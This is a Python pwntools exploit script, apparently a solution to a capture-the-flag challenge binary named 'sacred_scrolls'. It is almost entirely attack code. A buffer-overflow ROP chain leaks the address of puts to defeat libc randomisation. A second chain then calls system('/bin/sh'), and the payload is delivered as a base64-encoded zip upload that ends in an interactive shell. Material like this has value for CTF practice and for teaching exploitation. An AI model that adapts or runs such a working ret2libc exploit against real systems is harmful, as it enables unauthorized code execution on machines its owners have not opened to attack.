#!/usr/bin/env python3
from pwn import *
import os
import time

exe = context.binary = ELF("./sacred_scrolls")
libc = ELF("./glibc/libc.so.6")
rop = ROP(exe)

host = args.HOST or "127.0.0.1"
port = int(args.PORT or 1234)

def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def generate_input(rop):
    with open("spell.txt", "wb") as f:
        f.write(rop.chain())

    time.sleep(1)
    os.system("rm -f spell.zip")
    os.system("zip spell.zip spell.txt")
    os.system("base64 -w 0 < spell.zip > inp")
    time.sleep(1)

    with open("inp", "rb") as f:
        inp = f.read()
    return inp

def upload_read(io, inp):
    io.sendlineafter(b"tag: ", b"1")
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"zip): ", inp)
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", b"3")

pop_rdi_ret = rop.rdi.address
puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]
main_addr = exe.symbols["main"]
puts_offset = libc.symbols["puts"]

signature = b"\xf0\x9f\x91\x93\xe2\x9a\xa1"
pad = b"A" * 33

rop.raw(signature)
rop.raw(pad)
rop.raw(pop_rdi_ret)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(main_addr)

inp = generate_input(rop)

io = start()

upload_read(io, inp)

io.recvuntil(b"saved!\n")

leaked_puts = io.recvline().strip()
leaked_puts = int.from_bytes(leaked_puts, byteorder="little")
log.info(f"leaked: {hex(leaked_puts)}")

libc.address = leaked_puts - puts_offset

system_addr = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))

rop = ROP(exe)

rop.raw(signature)
rop.raw(pad)
rop.raw(rop.ret.address)
rop.raw(rop.rdi.address)
rop.raw(bin_sh)
rop.raw(system_addr)

inp = generate_input(rop)

upload_read(io, inp)

io.interactive()